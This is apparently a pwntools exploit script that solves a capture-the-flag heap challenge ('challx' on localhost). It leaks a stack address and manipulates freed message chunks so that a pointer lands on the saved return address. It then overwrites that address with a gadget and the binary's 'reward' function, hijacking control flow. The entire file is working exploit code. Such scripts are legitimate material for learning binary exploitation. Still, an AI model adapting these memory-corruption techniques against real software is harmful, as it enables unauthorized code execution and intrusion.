from pwn import *

r = remote("localhost", 5000)

# r = process("./challx")
# gdb.attach(r, gdbscript='''
# b main  
# b edit_message
# ''')

ELF = ELF("./challx")

context.log_level = "debug"

r.recvuntil(b"Message card store at address: ")
stack = int(r.recv(14), 16)


def send_text(where,size, what):
	print("send", where, "to", what)
	r.recvuntil(b"4 - Exit\n")
	r.sendline(b"0")

	r.sendlineafter(b"Index to store message: ",str(where).encode())
	r.sendlineafter(b"Enter size of message (max 64): ",str(size).encode())
	r.sendlineafter(b"Enter your message: ", what)
	print(r.recvuntil(b"Menu:"))
	
def read_text(where):
	print("read", where)
	r.recvuntil(b"4 - Exit\n")
	r.sendline(b"1")

	r.sendlineafter(b"Index to read message: ",str(where).encode())
	r.recvuntil(b": ")	
	x = r.read(6)
	# print(r.recvuntil(b"Menu:"))
	return x

def delete_text(where):
	r.recvuntil(b"4 - Exit\n")
	r.sendline(b"2")

	r.sendlineafter(b"Index to delete message: ",str(where).encode())
	print(r.recvuntil(b"Menu:"))

def edit_text(where, what):
	print("Edit", where, "to", what)
	r.recvuntil(b"4 - Exit\n")
	r.sendline(b"3")

	r.sendlineafter(b"Index to edit message: ",str(where).encode())
	# r.interactive()
	r.sendlineafter(b"Enter new message:", what)
	# print(r.recvuntil(b"Menu:"))

def exit():
	r.recvuntil(b"4 - Exit\n")
	r.sendline(b"4")

ret_addr = p64(stack + 0x68)
send_text(0, 64, b"A"*64)
send_text(1, 64, b"A"*64)
delete_text(1)
delete_text(0)
send_text(2, 0x30, p32(0x30)+b"a"*4 + ret_addr)
# print(read_text(1))
edit_text(1, p64(0x4018D9) + p64(ELF.symbols.reward))
exit()
r.interactive()